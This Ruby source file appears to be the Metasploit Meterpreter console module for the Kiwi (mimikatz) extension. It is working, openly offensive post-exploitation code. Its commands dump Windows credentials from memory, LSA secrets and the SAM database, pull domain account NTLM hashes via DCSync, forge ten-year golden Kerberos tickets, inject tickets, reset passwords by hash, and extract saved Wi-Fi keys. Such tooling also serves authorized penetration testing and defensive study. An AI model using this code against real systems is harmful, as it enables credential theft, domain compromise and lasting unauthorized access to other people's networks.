# -*- coding: binary -*-
require 'rex/post/meterpreter'

module Rex
module Post
module Meterpreter
module Ui

###
#
# Kiwi extension - grabs credentials from windows memory (newer OSes).
#
# Benjamin DELPY `gentilkiwi`
# http://blog.gentilkiwi.com/mimikatz
#
# extension converted by OJ Reeves (TheColonial)
#
###
class Console::CommandDispatcher::Kiwi

  Klass = Console::CommandDispatcher::Kiwi

  include Console::CommandDispatcher

  #
  # Name for this dispatcher
  #
  def name
    'Kiwi'
  end

  #
  # Initializes an instance of the priv command interaction. This function
  # also outputs a banner which gives proper acknowledgement to the original
  # author of the Mimikatz software.
  #
  def initialize(shell)
    super
    print_line
    print_line("  .#####.   mimikatz 2.2.0 20191125 (#{client.session_type})")
    print_line(" .## ^ ##.  \"A La Vie, A L'Amour\" - (oe.eo)")
    print_line(" ## / \\ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )")
    print_line(" ## \\ / ##       > http://blog.gentilkiwi.com/mimikatz")
    print_line(" '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )")
    print_line("  '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/")
    print_line

    si = client.sys.config.sysinfo
    if client.arch == ARCH_X86 && si['Architecture'] == ARCH_X64
      print_warning('Loaded x86 Kiwi on an x64 architecture.')
      print_line
    end

    if si['OS'] =~ /Windows (NT|XP|2000|2003|\.NET)/i
      print_warning("Loaded Kiwi on an old OS (#{si['OS']}). Did you mean to 'load mimikatz' instead?")
    end
  end

  #
  # List of supported commands.
  #
  def commands
    {
      'kiwi_cmd'              => 'Execute an arbitary mimikatz command (unparsed)',
      'dcsync'                => 'Retrieve user account information via DCSync (unparsed)',
      'dcsync_ntlm'           => 'Retrieve user account NTLM hash, SID and RID via DCSync',
      'creds_wdigest'         => 'Retrieve WDigest creds (parsed)',
      'creds_msv'             => 'Retrieve LM/NTLM creds (parsed)',
      'creds_ssp'             => 'Retrieve SSP creds',
      'creds_tspkg'           => 'Retrieve TsPkg creds (parsed)',
      'creds_kerberos'        => 'Retrieve Kerberos creds (parsed)',
      'creds_all'             => 'Retrieve all credentials (parsed)',
      'golden_ticket_create'  => 'Create a golden kerberos ticket',
      'kerberos_ticket_use'   => 'Use a kerberos ticket',
      'kerberos_ticket_purge' => 'Purge any in-use kerberos tickets',
      'kerberos_ticket_list'  => 'List all kerberos tickets (unparsed)',
      'lsa_dump_secrets'      => 'Dump LSA secrets (unparsed)',
      'lsa_dump_sam'          => 'Dump LSA SAM (unparsed)',
      'password_change'       => 'Change the password/hash of a user',
      'wifi_list'             => 'List wifi profiles/creds for the current user',
      'wifi_list_shared'      => 'List shared wifi profiles/creds (requires SYSTEM)',
    }
  end

  def cmd_kiwi_cmd(*args)
    output = client.kiwi.exec_cmd(args.join(' '))
    print_line(output)
  end

  #
  # Valid options for the password change feature
  #
  @@password_change_usage_opts = Rex::Parser::Arguments.new(
    '-h' => [false, 'Help banner'],
    '-u' => [true,  'User name of the password to change.'],
    '-s' => [true,  'Server to perform the action on (eg. Domain Controller).'],
    '-p' => [true,  'The known existing/old password (do not use with -n).'],
    '-n' => [true,  'The known existing/old hash (do not use with -p).'],
    '-P' => [true,  'The new password to set for the account (do not use with -N).'],
    '-N' => [true,  'The new hash to set for the account (do not use with -P).']
  )

  def cmd_password_change_usage
    print_line('Usage password_change [options]')
    print_line
    print_line(@@password_change_usage_opts.usage)
  end

  def cmd_password_change(*args)
    if args.length == 0 || args.include?('-h')
      cmd_password_change_usage
      return
    end

    opts = {}

    @@password_change_usage_opts.parse(args) { |opt, idx, val|
      case opt
      when '-u'
        opts[:user] = val
      when '-s'
        opts[:server] = val
      when '-p'
        opts[:old_pass] = val
      when '-n'
        opts[:old_hash] = val
      when '-P'
        opts[:new_pass] = val
      when '-N'
        opts[:new_hash] = val
      end
    }

    valid = true
    if opts[:old_pass] && opts[:old_hash]
      print_error('Options -p and -n cannot be used together.')
      valid = false
    end

    if opts[:new_pass] && opts[:new_hash]
      print_error('Options -P and -N cannot be used together.')
      valid = false
    end

    unless opts[:old_pass] || opts[:old_hash]
      print_error('At least one of -p and -n must be specified.')
      valid = false
    end

    unless opts[:new_pass] || opts[:new_hash]
      print_error('At least one of -P and -N must be specified.')
      valid = false
    end

    unless opts[:user]
      print_error('The -u parameter must be specified.')
      valid = false
    end

    if valid

      unless opts[:server]
        print_status('No server (-s) specified, defaulting to localhost.')
      end

      result = client.kiwi.password_change(opts)

      if result[:success] == true
        print_good("Success! New NTLM hash: #{result[:new]}")
      else
        print_error("Failed! #{result[:error]}")
      end
    end
  end

  def cmd_dcsync(*args)
    return unless check_is_domain_user

    if args.length != 1
      print_line('Usage: dcsync <DOMAIN\user>')
      print_line
      return
    end

    print_line(client.kiwi.dcsync(args[0]))
  end

  def cmd_dcsync_ntlm(*args)
    return unless check_is_domain_user

    if args.length != 1
      print_line('Usage: dcsync_ntlm <DOMAIN\user>')
      print_line
      return
    end

    user = args[0]
    result = client.kiwi.dcsync_ntlm(user)
    if result
      print_good("Account   : #{user}")
      print_good("NTLM Hash : #{result[:ntlm]}")
      print_good("LM Hash   : #{result[:lm]}")
      print_good("SID       : #{result[:sid]}")
      print_good("RID       : #{result[:rid]}")
    else
      print_error("Failed to retrieve information for #{user}")
    end
    print_line
  end

  #
  # Invoke the LSA secret dump on thet target.
  #
  def cmd_lsa_dump_secrets(*args)
    return unless check_is_system

    print_status('Dumping LSA secrets')
    print_line(client.kiwi.lsa_dump_secrets)
    print_line
  end

  #
  # Invoke the LSA SAM dump on thet target.
  #
  def cmd_lsa_dump_sam(*args)
    return unless check_is_system

    print_status('Dumping SAM')
    print_line(client.kiwi.lsa_dump_sam)
    print_line
  end

  #
  # Valid options for the golden ticket creation functionality.
  #
  @@golden_ticket_create_opts = Rex::Parser::Arguments.new(
    '-h' => [ false, 'Help banner' ],
    '-u' => [ true,  'Name of the user to create the ticket for (required)' ],
    '-i' => [ true,  'ID of the user to associate the ticket with' ],
    '-g' => [ true,  'Comma-separated list of group identifiers to include (eg: 501,502)' ],
    '-d' => [ true,  'FQDN of the target domain (required)' ],
    '-k' => [ true,  'krbtgt domain user NTLM hash' ],
    '-t' => [ true,  'Local path of the file to store the ticket in (required)' ],
    '-s' => [ true,  'SID of the domain' ],
    '-e' => [ true,  'End in ... Duration in hours (ex: -e 10 for 10 hours), default 10 YEARS']
  )

  #
  # Output the usage for the ticket listing functionality.
  #
  def golden_ticket_create_usage
    print_line('Usage: golden_ticket_create [options]')
    print_line
    print_line('Create a golden kerberos ticket that expires in 10 years time.')
    print_line(@@golden_ticket_create_opts.usage)
  end

  #
  # Invoke the golden kerberos ticket creation functionality on the target.
  #
  def cmd_golden_ticket_create(*args)

    if args.include?("-h")
      golden_ticket_create_usage
      return
    end

    target_file = nil
    opts = {
      user: nil,
      domain_name: nil,
      domain_sid: nil,
      krbtgt_hash: nil,
      user_id: nil,
      group_ids: nil,
      end_in: 87608
    }

    @@golden_ticket_create_opts.parse(args) { |opt, idx, val|
      case opt
      when '-u'
        opts[:user] = val
      when '-d'
        opts[:domain_name] = val
      when '-k'
        opts[:krbtgt_hash] = val
      when '-t'
        target_file = val
      when '-i'
        opts[:user_id] = val.to_i
      when '-g'
        opts[:group_ids] = val
      when '-s'
        opts[:domain_sid] = val
      when '-e'
        opts[:end_in] = val.to_i
      end
    }

    # we need the user and domain at the very least
    unless opts[:user] && opts[:domain_name] && target_file
      golden_ticket_create_usage
      return
    end

    # is anything else missing?
    unless opts[:domain_sid] && opts[:krbtgt_hash]
      return unless check_is_domain_user('Unable to run module as SYSTEM unless krbtgt and domain sid are provided')

      # let's go discover it
      krbtgt_username = opts[:user].split('\\')[0] + '\\krbtgt'
      dcsync_result = client.kiwi.dcsync_ntlm(krbtgt_username)
      unless opts[:krbtgt_hash]
        opts[:krbtgt_hash] = dcsync_result[:ntlm]
        print_warning("NTLM hash for krbtgt missing, using #{opts[:krbtgt_hash]} extracted from #{krbtgt_username}")
      end

      unless opts[:domain_sid]
        domain_sid = dcsync_result[:sid].split('-')
        opts[:domain_sid] = domain_sid[0, domain_sid.length - 1].join('-')
        print_warning("Domain SID missing, using #{opts[:domain_sid]} extracted from SID of #{krbtgt_username}")
      end
    end

    ticket = client.kiwi.golden_ticket_create(opts)

    ::File.open(target_file, 'wb') do |f|
      f.write(ticket)
    end

    print_good("Golden Kerberos ticket written to #{target_file}")
  end

  #
  # Valid options for the ticket listing functionality.
  #
  @@kerberos_ticket_list_opts = Rex::Parser::Arguments.new(
    '-h' => [ false, 'Help banner' ],
  )

  #
  # Output the usage for the ticket listing functionality.
  #
  def kerberos_ticket_list_usage
    print_line('Usage: kerberos_ticket_list [options]')
    print_line
    print_line('List all the available Kerberos tickets.')
    print_line(@@kerberos_ticket_list_opts.usage)
  end

  #
  # Invoke the kerberos ticket listing functionality on the target machine.
  #
  def cmd_kerberos_ticket_list(*args)
    if args.include?('-h')
      kerberos_ticket_list_usage
      return
    end

    output = client.kiwi.kerberos_ticket_list.strip
    if output == ''
      print_error('No kerberos tickets exist in the current session.')
    else
      print_good('Kerberos tickets found in the current session.')
      print_line(output)
    end
    print_line
  end

  #
  # Invoke the kerberos ticket purging functionality on the target machine.
  #
  def cmd_kerberos_ticket_purge(*args)
    client.kiwi.kerberos_ticket_purge
    print_good('Kerberos tickets purged')
  end

  #
  # Use a locally stored Kerberos ticket in the current session.
  #
  def cmd_kerberos_ticket_use(*args)
    if args.length != 1
      print_line('Usage: kerberos_ticket_use ticketpath')
      return
    end

    target = args[0]
    ticket  = ''
    ::File.open(target, 'rb') do |f|
      ticket += f.read(f.stat.size)
    end

    print_status("Using Kerberos ticket stored in #{target}, #{ticket.length} bytes ...")
    if client.kiwi.kerberos_ticket_use(ticket)
      print_good('Kerberos ticket applied successfully.')
    else
      print_error('Kerberos ticket application failed.')
    end
  end

  #
  # Dump all the shared wifi profiles/credentials
  #
  def cmd_wifi_list_shared(*args)
    interfaces_dir = client.sys.config.getenv('AllUsersProfile') + '\Microsoft\Wlansvc\Profiles\Interfaces'
    files = client.fs.file.search(interfaces_dir, '*.xml', true)

    if files.length == 0
      print_error('No shared WiFi profiles found.')
    else
      interfaces = {}
      files.each do |f|
        interface_guid = f['path'].split("\\")[-1]
        full_path = "#{f['path']}\\#{f['name']}"

        interfaces[interface_guid] ||= []
        interfaces[interface_guid] << full_path
      end
      results = client.kiwi.wifi_parse_shared(interfaces)

      if results.length > 0
        display_wifi_profiles(results)
      else
        print_line
        print_error('No shared wireless profiles found on the target.')
      end
    end

    true
  end

  #
  # Dump all the wifi profiles/credentials for the current user
  #
  def cmd_wifi_list(*args)
    results = client.kiwi.wifi_list
    if results.length > 0
      display_wifi_profiles(results)
    else
      print_line
      print_error('No wireless profiles found on the target.')
    end

    true
  end

  @@creds_opts = Rex::Parser::Arguments.new(
    '-o' => [ true,  'Write the output to the specified file.' ],
    '-h' => [ false, 'Help menu.' ]
  )

  #
  # Displays information about the various creds commands
  #
  def cmd_creds_usage(provider)
    print_line("Usage: creds_#{provider} [options]")
    print_line
    print_line("Dump #{provider} credentials.")
    print_line(@@creds_opts.usage)
  end

  #
  # Dump all the possible credentials to screen.
  #
  def cmd_creds_all(*args)
    method = Proc.new { client.kiwi.creds_all }
    scrape_passwords('all', method, args)
  end

  #
  # Dump all wdigest credentials to screen.
  #
  def cmd_creds_wdigest(*args)
    method = Proc.new { client.kiwi.creds_wdigest }
    scrape_passwords('wdigest', method, args)
  end

  #
  # Dump all msv credentials to screen.
  #
  def cmd_creds_msv(*args)
    method = Proc.new { client.kiwi.creds_msv }
    scrape_passwords('msv', method, args)
  end

  #
  # Dump all SSP credentials to screen.
  #
  def cmd_creds_ssp(*args)
    method = Proc.new { client.kiwi.creds_ssp }
    scrape_passwords('ssp', method, args)
  end

  #
  # Dump all TSPKG credentials to screen.
  #
  def cmd_creds_tspkg(*args)
    method = Proc.new { client.kiwi.creds_tspkg }
    scrape_passwords('tspkg', method, args)
  end

  #
  # Dump all Kerberos credentials to screen.
  #
  def cmd_creds_kerberos(*args)
    method = Proc.new { client.kiwi.creds_kerberos }
    scrape_passwords('kerberos', method, args)
  end

protected

  def display_wifi_profiles(profiles)
    profiles.each do |r|
      header = r[:guid]
      header = "#{r[:desc]} - #{header}" if r[:desc]
      table = Rex::Text::Table.new(
        'Header'    => header,
        'Indent'    => 0,
        'SortIndex' => 0,
        'Columns'   => [
          'Name', 'Auth', 'Type', 'Shared Key'
        ]
      )

      print_line
      r[:profiles].each do |p|
        table << [p[:name], p[:auth], p[:key_type] || 'Unknown', p[:shared_key]]
      end

      print_line(table.to_s)
      print_line("State: #{r[:state] || 'Unknown'}")
    end
  end


  def check_is_domain_user(msg='Running as SYSTEM, function will not work.')
    if client.sys.config.is_system?
      print_warning(msg)
      return false
    end

    true
  end

  def check_is_system
    if client.sys.config.is_system?
      print_good('Running as SYSTEM')
      return true
    end

    print_warning('Not running as SYSTEM, execution may fail')
    false
  end

  #
  # Invoke the password scraping routine on the target.
  #
  # @param provider [String] The name of the type of credentials to dump
  #   (used for display purposes only).
  # @param method [Proc] Block that calls the method that invokes the
  #   appropriate function on the client that returns the results from
  #   Meterpreter that lay in the house that Jack built.
  #
  # @return [void]
  def scrape_passwords(provider, method, args)
    if args.include?('-h')
      cmd_creds_usage(provider)
      return
    end

    return unless check_is_system
    print_status("Retrieving #{provider} credentials")
    accounts = method.call
    output = ""

    accounts.keys.each do |k|
      next if accounts[k].length == 0

      # Keep track of the columns that we were given, in
      # the order we are given them, while removing duplicates
      columns = []
      existing = Set.new
      accounts[k].each do |acct|
        acct.keys.each do |k|
          unless existing.include?(k)
            columns << k
            existing.add(k)
          end
        end
      end

      table = Rex::Text::Table.new(
        'Header'    => "#{k} credentials",
        'Indent'    => 0,
        'SortIndex' => 0,
        'Columns'   => columns
      )

      accounts[k].each do |acct|
        values = []
        # Iterate through the given columns and match the values up
        # correctly based on the index of the column header.
        columns.each do |c|
          col_idx = acct.keys.index(c)
          # If the column exists, we'll use the value that is associated
          # with the column based on its index
          if col_idx
            values << acct.values[col_idx]
          else
            # Otherwise, just add a blank value
            values << ''
          end
        end
        table << values
      end

      output << table.to_s + "\n"
    end

    print_line(output)

    # determine if a target file path was passed in
    file_index = args.index('-o')
    unless file_index.nil?
      if args.length > file_index + 1
        # try to write the file to disk
        begin
          ::File.write(args[file_index + 1], output)
          print_good("Output written to #{args[file_index + 1]}")
        rescue
          print_error("Unable to write to #{args[file_index + 1]}")
        end
      else
        print_error('Missing file path for -o parameter')
      end
    end

    return true
  end

  #
  # Helper function to convert a potentially blank value to hex and have
  # the outer spaces stripped
  #
  # @param (see Rex::Text.to_hex)
  # @return [String] The result of {Rex::Text.to_hex}, strip'd
  def to_hex(value, sep = '')
    Rex::Text.to_hex(value || '', sep).strip
  end

end

end
end
end
end
